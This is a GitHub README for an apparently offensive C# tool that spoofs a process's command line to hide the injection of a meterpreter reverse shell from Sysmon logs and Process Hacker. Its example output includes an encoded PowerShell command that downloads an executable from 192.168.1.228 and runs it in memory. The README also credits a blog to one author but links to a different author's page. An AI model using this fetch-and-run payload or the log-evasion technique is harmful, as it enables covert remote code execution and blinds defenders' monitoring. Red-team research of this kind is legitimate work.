# Command Line Spoofer

An example of using C# to inject a meterpreter shell, whilst spoofing the command line. The command line is stored in the Process Environment Block, is logged when a new process starts, and is displayed in tools such as Process Hacker and Task Manager.

# Introduction
This code is based on the [How to Argue like Cobalt Strike](https://jhalon.github.io/utilizing-syscalls-in-csharp-1/) blog by **Adam Chester/XPN**, the blog explains how cobalt strike spoofs the command line of a process when injecting a beacon.

I used this as a basis to create a C# version that spawns a PowerShell process and injects a meterpreter reverse shell. Granted there is no need for a .Net binary to do this but it demonstrates how commands can be spoofed.

A new process is started in a suspended state with a spoofed command line argument.

The spoofed command is logged but we are able to change the command line in the process PEB. When the main thread is resumed the process uses the new command line in the PEB.

# Example

Execution of the code is shown below:

```
[+] Spoofing command: powershell.exe nothing to see here! :-P
[+] Process spawned, PID: 8588
[+] PEB Address: 0x2B2366F000
[+] ProcessParameters Address: 0x1EF61560000
[+] CommandLine Address: 0x1EF615606BC
[+] Original CommandLine: powershell.exe nothing to see here! :-P                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
[+] New CommandLine: powershell.exe -exec bypass -enc WwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMgAyADgALwBwAC4AZQB4AGUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAuAEMAbwBuAHQAZQBuAHQAKQAuAEUAbgB0AHIAeQBQAG8AaQBuAHQALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsACAAKAAsACAAWwBzAHQAcgBpAG4AZwBbAF0AXQAgACgAJwAxADkAMgAuADEANgA4AC4AMQAuADIAMgA4ACcALAAgAFsAcwB0AHIAaQBuAGcAXQAgACQAUABJAEQALAAgACcAMQAwACcAKQApACkAOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwADAAMAB9AA== , written to process
[+] Resuming process
```

# Proof of Concept

Sysmon logs the original (spoofed) command line:

![Sysmon](https://github.com/plackyhacker/CmdLineSpoofer/blob/master/sysmon.png?raw=true)

Process Hacker does not reveal the executed command:

![Process Hacker](https://github.com/plackyhacker/CmdLineSpoofer/blob/master/process_hacker.png?raw=true)
